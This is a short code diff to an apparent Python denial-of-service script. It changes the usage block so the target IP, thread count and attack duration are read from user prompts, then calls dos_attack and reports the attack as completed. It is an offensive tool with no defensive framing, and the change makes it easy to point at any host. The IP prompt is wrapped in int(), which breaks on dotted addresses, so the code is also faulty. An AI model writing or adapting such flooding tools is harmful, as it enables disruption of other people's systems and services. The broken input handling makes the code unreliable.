@@ -63,9 +63,9 @@ def dos_attack(target_ip: str, thread_count: int, attack_time: int):
 # Example usage of the dos_attack function:
  
 try:
-    target_ip = "192.168.0.1"
-    thread_count = 10
-    attack_time = 60
+    target_ip = int(input( "enter ip : "))
+    thread_count = int(input( "enter thread : "))
+    attack_time = int(input( "enter time : "))
  
     dos_attack(target_ip, thread_count, attack_time)
     print(f"DoS attack on {target_ip} with {thread_count} threads for {attack_time} seconds completed.")
